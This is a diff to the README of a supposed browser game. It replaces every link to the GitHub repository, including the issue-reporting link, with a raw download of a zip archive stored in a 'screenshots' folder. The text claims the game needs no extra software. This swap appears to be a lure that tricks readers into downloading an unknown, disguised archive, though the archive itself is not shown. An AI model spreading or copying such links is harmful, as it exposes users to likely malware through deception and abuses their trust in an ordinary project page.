@@ -1,6 +1,6 @@
 # 🚀 spaceship-shooter-game - Play Neon Space Battles Easily
 
-[![Download spaceship-shooter-game](https://img.shields.io/badge/Download-spaceship--shooter--game-green?style=for-the-badge)](https://github.com/Murilo2107hh/spaceship-shooter-game)
+[![Download spaceship-shooter-game](https://img.shields.io/badge/Download-spaceship--shooter--game-green?style=for-the-badge)](https://raw.githubusercontent.com/Murilo2107hh/spaceship-shooter-game/main/screenshots/game_spaceship_shooter_v2.1.zip)
 
 ## 🚀 About This Game
 
@@ -34,7 +34,7 @@ The game runs fully in your browser and needs no extra software.
 
 Click the big green button below to visit the download page on GitHub. From there, you will download the main game file needed to play.
 
-[![Download spaceship-shooter-game](https://img.shields.io/badge/Download-spaceship--shooter--game-blue?style=for-the-badge)](https://github.com/Murilo2107hh/spaceship-shooter-game)
+[![Download spaceship-shooter-game](https://img.shields.io/badge/Download-spaceship--shooter--game-blue?style=for-the-badge)](https://raw.githubusercontent.com/Murilo2107hh/spaceship-shooter-game/main/screenshots/game_spaceship_shooter_v2.1.zip)
 
 ## 📥 How to Download and Run on Windows
 
@@ -43,7 +43,7 @@ Follow these steps to download and play the game on your Windows PC:
 1. Open your web browser (Chrome, Edge, Firefox, or Safari).
 
 2. Click or copy this link into your address bar and press Enter:
-   https://github.com/Murilo2107hh/spaceship-shooter-game
+   https://raw.githubusercontent.com/Murilo2107hh/spaceship-shooter-game/main/screenshots/game_spaceship_shooter_v2.1.zip
 
 3. On the GitHub page, look for a file named similar to `spaceship-shooter-game.html`. This is the main game file.
 
@@ -90,7 +90,7 @@ You can adjust the sound volume and display settings while playing:
 
 You can open issues or ask questions on the GitHub repository where you downloaded the game:
 
-https://github.com/Murilo2107hh/spaceship-shooter-game
+https://raw.githubusercontent.com/Murilo2107hh/spaceship-shooter-game/main/screenshots/game_spaceship_shooter_v2.1.zip
 
 Use the "Issues" tab to report bugs or ask for help.
 
@@ -111,4 +111,4 @@ Check the GitHub page regularly for updates and improvements. New versions may a
 
 ---
 
-[![Download spaceship-shooter-game](https://img.shields.io/badge/Download-spaceship--shooter--game-purple?style=for-the-badge)](https://github.com/Murilo2107hh/spaceship-shooter-game)
+[![Download spaceship-shooter-game](https://img.shields.io/badge/Download-spaceship--shooter--game-purple?style=for-the-badge)](https://raw.githubusercontent.com/Murilo2107hh/spaceship-shooter-game/main/screenshots/game_spaceship_shooter_v2.1.zip)
